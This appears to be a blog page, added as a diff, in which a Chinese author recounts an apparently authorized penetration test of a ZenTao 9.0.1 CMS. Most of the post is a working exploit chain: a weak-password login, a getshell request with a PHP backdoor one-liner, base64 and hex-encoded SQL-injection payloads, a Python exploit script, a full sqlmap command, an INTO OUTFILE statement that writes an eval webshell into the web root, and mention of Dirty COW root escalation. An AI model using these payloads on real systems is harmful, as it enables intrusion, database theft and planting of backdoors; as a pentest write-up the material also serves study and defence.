@@ -1,0 +1,1372 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="cn">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+  
+  
+    
+      
+    
+    
+      
+    
+  <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+  <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-flash.min.css" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Monda:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+  
+
+<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.4.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.4.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.4.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="命运将我推的更远，本是为了让我更走近你!  唉，没错又是我，最近碰上了一个禅道的cms系统，看了下网上并没有对这个cms比较系统的攻击方法，于是写下此文希望对大家能有所帮助。（公司授权站点，打码严重，万望见谅） 站点地址：http://xxx.xxx.xxx.xxx:8090/  cms版本：禅道9.0.1">
+<meta name="keywords" content="禅道,测试">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次禅道cms测试">
+<meta property="og:url" content="https://lengjibo.github.io/cs/index.html">
+<meta property="og:site_name" content="冷逸的个人博客|开往安河桥北~">
+<meta property="og:description" content="命运将我推的更远，本是为了让我更走近你!  唉，没错又是我，最近碰上了一个禅道的cms系统，看了下网上并没有对这个cms比较系统的攻击方法，于是写下此文希望对大家能有所帮助。（公司授权站点，打码严重，万望见谅） 站点地址：http://xxx.xxx.xxx.xxx:8090/  cms版本：禅道9.0.1">
+<meta property="og:locale" content="cn">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g6lddebvrnj30g5095weq.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g6lde4pycsj30p308k3zb.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g6ldeyhanxj30d103gq2x.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g6ldfnkvdrj30dv06awen.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g6ldggis4fj30dv06awen.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g6ldhudrkvj30hu02ddft.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g6ldixvu5dj30cp01t0sr.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g6ldk9va0aj30ju099abb.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g6ldl1qhb5j30hw08a0t6.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g6ldmm394pj30i20cvwee.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g6ldn6juolj30bg02dgln.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g6ldnq4gt9j30me01ymx7.jpg">
+<meta property="og:updated_time" content="2019-09-02T11:03:32.768Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="记一次禅道cms测试">
+<meta name="twitter:description" content="命运将我推的更远，本是为了让我更走近你!  唉，没错又是我，最近碰上了一个禅道的cms系统，看了下网上并没有对这个cms比较系统的攻击方法，于是写下此文希望对大家能有所帮助。（公司授权站点，打码严重，万望见谅） 站点地址：http://xxx.xxx.xxx.xxx:8090/  cms版本：禅道9.0.1">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g6lddebvrnj30g5095weq.jpg">
+
+
+
+  <link rel="alternate" href="/../../.deploy_git/atom.xml" title="冷逸的个人博客|开往安河桥北~" type="application/atom+xml" />
+
+
+
+
+  <link rel="canonical" href="https://lengjibo.github.io/cs/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>记一次禅道cms测试 | 冷逸的个人博客|开往安河桥北~</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="cn">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">冷逸的个人博客|开往安河桥北~</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Startseite</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />Über</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Kategorien</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archiv</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-book">
+    <a href="/book/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-book"></i> <br />book</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://lengjibo.github.io/cs/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="冷逸">
+      <meta itemprop="description" content="做一个温柔的人...">
+      <meta itemprop="image" content="https://i.screenshot.net/9zoe9ax">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="冷逸的个人博客|开往安河桥北~">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">记一次禅道cms测试
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2019-09-02 18:05:08 / Updated at: 19:03:32" itemprop="dateCreated datePublished" datetime="2019-09-02T18:05:08+08:00">2019-09-02</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Web安全/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon"
+            >
+            <i class="fa fa-eye"></i>
+             Views:  
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>命运将我推的更远，本是为了让我更走近你!</p>
+<hr>
+<p>唉，没错又是我，最近碰上了一个禅道的cms系统，看了下网上并没有对这个cms比较系统的攻击方法，于是写下此文希望对大家能有所帮助。（公司授权站点，打码严重，万望见谅）</p>
+<p>站点地址：<a href="http://xxx.xxx.xxx.xxx:8090/" target="_blank" rel="noopener">http://xxx.xxx.xxx.xxx:8090/</a>  cms版本：禅道9.0.1</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g6lddebvrnj30g5095weq.jpg" alt="图片1.png"></p>
+<a id="more"></a>
+<p>因为个人习惯问题，喜欢测试弱口令，经过一番测试，得到其中一个用户的弱口令：keno、123456</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g6lde4pycsj30p308k3zb.jpg" alt="图片2.png"></p>
+<p>后台存在上传点，可以任意文件上传，可是传完之后会被添加.txt的后缀，且无法突破，于是放弃。在网上搜索发现了两篇文章</p>
+<p><a href="https://www.cnblogs.com/iamstudy/articles/chandao_pentest_1.html" target="_blank" rel="noopener">https://www.cnblogs.com/iamstudy/articles/chandao_pentest_1.html</a></p>
+<p><a href="https://seaii-blog.com/index.php/2018/07/02/83.html" target="_blank" rel="noopener">https://seaii-blog.com/index.php/2018/07/02/83.html</a></p>
+<p>查看版本：</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g6ldeyhanxj30d103gq2x.jpg" alt="图片3.png"></p>
+<p>发现可能存在的漏洞点如下：</p>
+<p>1、任意文件读取</p>
+<p>2、直接getshell</p>
+<p>3、Sql注入漏洞</p>
+<p>逐一测试<br>任意文件读取失败访问index.php?m=editor&amp;f=edit</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g6ldfnkvdrj30dv06awen.jpg" alt="图片4.png"></p>
+<p>需要admin权限，但是我没有..</p>
+<p>而关于getshell也是一样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/?m=api&amp;f=getModel&amp;moduleName=editor&amp;methodName=save&amp;params=filePath=aaaaaa.php </span><br><span class="line"></span><br><span class="line">POST内容: fileContent=&lt;?php $_POST[1]($_POST[2]); </span><br><span class="line"></span><br><span class="line">最后的shell地址是\zentaopro\module\api\aaaaaa.php</span><br></pre></td></tr></table></figure>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g6ldggis4fj30dv06awen.jpg" alt="图片5.png"></p>
+<p>不知道是不是二改了cms…</p>
+<p>最后的希望，sql注入，由文章我们可以知道禅道存在的sql注入是limit后的注入点<br>这里没有使用文中给出的exp，而是我自己使用extractvalue构造了一个注入语句<br>使用payload测试：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">利用：/index.php?m=block&amp;f=main&amp;mode=getblockdata&amp;blockid=case&amp;param=</span><br><span class="line">EXP：&#123;&quot;orderBy&quot;:&quot;order limit 1,1 PROCEDURE ANALYSE(extractvalue(rand(),concat(0x3a,version())),1)#&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>最后将exp进行base64编码</p>
+<p>发现可以注入</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g6ldhudrkvj30hu02ddft.jpg" alt="图片6.png"></p>
+<p>使用python的自动化exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json,requests,re</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://xxx.xxx.xxx.xxx:8090/zentao/'</span></span><br><span class="line">payload = <span class="string">'/index.php?m=block&amp;f=main&amp;mode=getblockdata&amp;blockid=case&amp;param='</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> url.startswith(<span class="string">'http'</span>):</span><br><span class="line">    url = <span class="string">'http'</span> + url</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"</span>,</span><br><span class="line">    <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>,</span><br><span class="line">    <span class="string">"Referer"</span>:url</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxIFBST0NFRFVSRSBBTkFMWVNFKGV4dHJhY3R2YWx1ZShyYW5kKCksY29uY2F0KDB4M2EsdmVyc2lvbigpKSksMSkjIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ=='</span></span><br><span class="line">payload2 = <span class="string">'eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxIFBST0NFRFVSRSBBTkFMWVNFKGV4dHJhY3R2YWx1ZShyYW5kKCksY29uY2F0KDB4M2EsZGF0YWJhc2UoKSkpLDEpIyIsIm51bSI6IjEsMSIsInR5cGUiOiJvcGVuZWRieW1lIn0='</span></span><br><span class="line">payload3 = <span class="string">'eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxIFBST0NFRFVSRSBBTkFMWVNFKGV4dHJhY3R2YWx1ZShyYW5kKCksY29uY2F0KDB4M2EsdXNlcigpKSksMSkjIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ=='</span></span><br><span class="line">exp = payload1</span><br><span class="line">exp2 = payload2</span><br><span class="line">exp3 = payload3</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = requests.get(url+payload+exp,headers=headers)</span><br><span class="line">    bug = re.findall(<span class="string">"1105 XPATH syntax error: ':(.*?)'&lt;p&gt;"</span>,r.text)[<span class="number">0</span>]</span><br><span class="line">    print(<span class="string">'漏洞存在，当前数据库版本为：'</span> + bug)</span><br><span class="line">    r = requests.get(url+payload+exp2,headers=headers)</span><br><span class="line">    bug = re.findall(<span class="string">"1105 XPATH syntax error: ':(.*?)'&lt;p&gt;"</span>,r.text)[<span class="number">0</span>]</span><br><span class="line">    print(<span class="string">'漏洞存在，当前数据库为：'</span> + bug)</span><br><span class="line">    r = requests.get(url+payload+exp3,headers=headers)</span><br><span class="line">    bug = re.findall(<span class="string">"1105 XPATH syntax error: ':(.*?)'&lt;p&gt;"</span>,r.text)[<span class="number">0</span>]</span><br><span class="line">    print(<span class="string">'漏洞存在，当前数据库用户为：'</span> + bug)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    print(<span class="string">'漏洞检测失败'</span>)</span><br></pre></td></tr></table></figure>
+<p>得到以下信息（这里此时可以直接使用py的base64编码功能但是不知道为什么一直失败，于是便手动编码了一下）</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g6ldixvu5dj30cp01t0sr.jpg" alt="图片7.png"></p>
+<p>但是与文中所说的一样没有办法进行数据获取，即使给出了盲注的写法，但是既然能手工注入，那么sqlmap一定也可以，毕竟客户不只会满足一个只能获取信息的注入点</p>
+<p>这里先介绍sqlmap的两个参数</p>
+<blockquote>
+<p>–suffix=” – “ (修改后缀) –prefix=”)” (修改前缀)</p>
+</blockquote>
+<p>那么这样我们就可以注入了，payload如下，其中的\是为了防止转义</p>
+<p>Sqlmap:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://xxx.xxx.xxx.xxx:8090/zentao/index.php?m=block&amp;f=main&amp;mode=getblockdata&amp;blockid=case&amp;param=&quot; --referer=&quot;http://xxx.xxx.xxx.xxx:8090/zentao/&quot; --tamper=base64encode --level 5 --prefix=&quot;&#123;\&quot;orderBy\&quot;:\&quot;order limit 1&quot; --suffix=&quot;\&quot;,\&quot;num\&quot;:\&quot;1,1\&quot;,\&quot;type\&quot;:\&quot;openedbyme\&quot;&#125;&quot; --risk 3 --time-sec=2 -v 3 -p param --dbms=mysql</span><br></pre></td></tr></table></figure>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g6ldk9va0aj30ju099abb.jpg" alt="图片8.png"></p>
+<p>这样我们就可以使用sqlmap进行数据获取了，那么我们还是需要getshell了<br>写webshell，前面的文章说了它过滤了下划线，我们可以使用mysql的预查询来绕过，我们也可以使用同样的方法来写入一个webshell</p>
+<p>网上有篇文章是使用的报绝对路径的方法，<a href="http://ximcx.cn/post-141.html" target="_blank" rel="noopener">http://ximcx.cn/post-141.html</a><br>可是经过尝试并不可以，后来询问大佬，大佬给出了一些提示，具体攻击手法如下</p>
+<p>查看路径</p>
+<p><a href="http://xxx.xxx.xxx.xxx:8090/zentao/user-reset.html" target="_blank" rel="noopener">http://xxx.xxx.xxx.xxx:8090/zentao/user-reset.html</a></p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g6ldl1qhb5j30hw08a0t6.jpg" alt="图片9.png"></p>
+<p>提交地址：<a href="http://xxx.xxx.xxx.xxx:8090/zentao/index.php?m=block&amp;f=main&amp;mode=getblockdata&amp;blockid=case&amp;param=" target="_blank" rel="noopener">http://xxx.xxx.xxx.xxx:8090/zentao/index.php?m=block&amp;f=main&amp;mode=getblockdata&amp;blockid=case&amp;param=</a></p>
+<p>写入忘记密码的文本：</p>
+<p>shell语句命令：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">''</span> <span class="keyword">into</span> <span class="keyword">outfile</span> /opt/zbox/app/zentao/tmp/reset_5c7e631454ae5.txt<span class="string">'</span></span><br></pre></td></tr></table></figure>
+<p>HEX编码：（注意加密解密都不带0x，但是EXP中需要加上）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2f6f70742f7a626f782f6170702f7a656e74616f2f746d702f72657365745f356436343865396665363933312e747874</span><br></pre></td></tr></table></figure>
+<p>注入文件语句：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"orderBy"</span>:<span class="string">"order limit 1;SET @SQL=0x2f6f70742f7a626f782f6170702f7a656e74616f2f746d702f72657365745f356436343865396665363933312e747874;PREPARE pord FROM @SQL;EXECUTE pord;-- -"</span>,<span class="attr">"num"</span>:<span class="string">"1,1"</span>,<span class="attr">"type"</span>:<span class="string">"openedbyme"</span>&#125;</span><br></pre></td></tr></table></figure>
+<p>进行编码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMTtTRVQgQFNRTD0weDJmNmY3MDc0MmY3YTYyNmY3ODJmNjE3MDcwMmY3YTY1NmU3NDYxNmYyZjc0NmQ3MDJmNzI2NTczNjU3NDVmMzU2NDM2MzQzODY1Mzk2NjY1MzYzOTMzMzEyZTc0Nzg3NDtQUkVQQVJFIHBvcmQgRlJPTSBAU1FMO0VYRUNVVEUgcG9yZDstLSAtIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ==</span><br></pre></td></tr></table></figure>
+<p>shell语句命令：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">'&lt;?php @eval($_POST[123456])?&gt;'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'/opt/zbox/app/zentao/www/hack.php'</span></span><br></pre></td></tr></table></figure>
+<p>HEX编码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">73656c65637420273c3f70687020406576616c28245f504f53545b3132333435365d293f3e2720696e746f206f757466696c6520272f6f70742f7a626f782f6170702f7a656e74616f2f7777772f6861636b2e70687027</span><br></pre></td></tr></table></figure>
+<p>编码</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"orderBy"</span>:<span class="string">"order limit 1;SET @SQL=0x73656c65637420273c3f70687020406576616c28245f504f53545b3132333435365d293f3e2720696e746f206f757466696c6520272f6f70742f7a626f782f6170702f7a656e74616f2f7777772f6861636b2e70687027;PREPARE pord FROM @SQL;EXECUTE pord;-- -"</span>,<span class="attr">"num"</span>:<span class="string">"1,1"</span>,<span class="attr">"type"</span>:<span class="string">"openedbyme"</span>&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g6ldmm394pj30i20cvwee.jpg" alt="图片10.png"></p>
+<p>写入一个shell成功。具体原理其实跟西门大佬说的差不多，只是多了往忘记密码的文本写入内容的过程，具体为什么需要写入内容才能getshell，我觉得是和任意文件读取哪里有异曲同工之妙，具体的分析就留给各位师傅了。</p>
+<p>进行提权：</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g6ldn6juolj30bg02dgln.jpg" alt="图片11.png"></p>
+<p>普通权限，<br>3.x的内核</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1g6ldnq4gt9j30me01ymx7.jpg" alt="图片12.png"></p>
+<p>脏牛走起，传exp，执行得到root权限，剩下的？剩下的还用我说，自然是删除shell，写报告啊…..</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/cs/">记一次禅道cms测试</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 冷逸 的个人博客">冷逸</a></p>
+  <p><span>发布时间:</span>2019年09月02日 - 18:09</p>
+  <p><span>最后更新:</span>2019年09月02日 - 19:09</p>
+  <p><span>原始链接:</span><a href="/cs/" title="记一次禅道cms测试">https://lengjibo.github.io/cs/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://lengjibo.github.io/cs/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+    });
+    });  
+</script>
+
+
+      
+    </div>
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #555;font-size:14px;">-------------The End-------------</div>
+    
+</div>
+
+      
+    </div>
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.png" alt="冷逸 WeChat Pay"/>
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/zhifubao.jpg" alt="冷逸 Alipay"/>
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/禅道/" rel="tag"><i class="fa fa-tag"></i> 禅道</a>
+          
+            <a href="/tags/测试/" rel="tag"><i class="fa fa-tag"></i> 测试</a>
+          
+        </div>
+      
+
+      
+      
+        <div class="post-widgets">
+        
+
+        
+
+        
+          
+          <div class="social_share">
+            
+               <div>
+                 
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
